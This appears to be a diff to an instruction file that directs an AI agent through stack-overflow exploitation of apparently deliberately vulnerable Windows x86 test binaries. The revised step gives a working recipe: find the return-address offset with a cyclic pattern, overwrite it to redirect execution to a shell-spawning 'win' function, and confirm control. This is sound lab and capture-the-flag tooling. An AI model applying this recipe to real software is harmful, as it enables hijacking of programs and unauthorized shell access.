@@ -172,20 +172,23 @@ DRIVING A TARGET THAT READS STDIN (pwn workflow):
   3. `continue` is time-bounded here: a stop whose reason is "timeout" means the
      process is STILL RUNNING (it did NOT crash — usually waiting for input).
      Feed it and continue again; do not conclude it is unexploitable.
-  4. Classic stack-overflow recipe on a no-ASLR/no-DEP binary — do it in ONE
-     ```python block so it doesn't stall between steps:
-        send(cyclic(400)); shutdown_stdin(); print(dbg("c"))   # crash the copy
-        st = state(); print(st)      # exception_addr = the TRUE faulting EIP
-        fault = st.get("exception_addr")
-        print("offset", cyclic_find(fault))
-     CRITICAL: for the offset use state()["exception_addr"] (the exception
-     record's faulting address) — NOT regs()["Eip"]. On this build the target is
-     emulated x86 (WoW64) and the Eip REGISTER is unreliable at a fault, but the
-     exception address is correct. If a `continue` after the crash hangs, don't
-     re-continue in a loop — you already have exception_addr; move on to the
-     payload. Then: payload = b"A"*offset + p32(win_addr); rerun with `run -i`,
-     send(payload); shutdown_stdin(); print(dbg("c")); and VERIFY success
-     empirically (a cmd.exe/child spawned, a flag printed, recv() output).
+  4. OFFSET FINDING — THIS BUILD IS EMULATED x86 (WoW64-on-ARM). A jump/return to
+     a controlled address faults INSIDE the emulator, so after a crash NEITHER
+     regs()["Eip"] NOR state()["exception_addr"] gives the controlled value, and
+     the crashed process often wedges. Do NOT rely on crashing to read EIP.
+     THE RELIABLE METHOD — breakpoint the vulnerable function's `ret` and read the
+     saved return address straight off the stack (no crash). In ONE python block:
+        # vfn = the function that calls gets/read/strcpy; find its `ret` via disasm
+        dbg("disasm 0x401553 40")     # locate the RET (e.g. 0x4015b1)
+        dbg("bp 0x4015b1")            # breakpoint ON the ret
+        send(cyclic(80)); shutdown_stdin(); dbg("c")   # stops AT the ret
+        esp = getreg("Esp"); saved = u32(read(esp, 4))
+        print("offset", cyclic_find(saved))            # e.g. 44
+     Then payload = b"A"*offset + p32(win_addr). rerun with `run -i`, send it,
+     shutdown_stdin(), and CONFIRM control: set a breakpoint on win (dbg("bp
+     <win>")) BEFORE continuing — if that breakpoint is hit, the hijack worked
+     (win is valid code, so it does not fault the emulator). Then let it run and
+     look for the flag / SHELL_POPPED marker in recv() output.
   5. Find the target: inspect `iat`, strings, and xrefs to interesting strings
      (system / WinExec / "cmd.exe"). A hidden function that spawns a shell is your
      ret2win target. With DEP off you can alternatively jump to shellcode placed
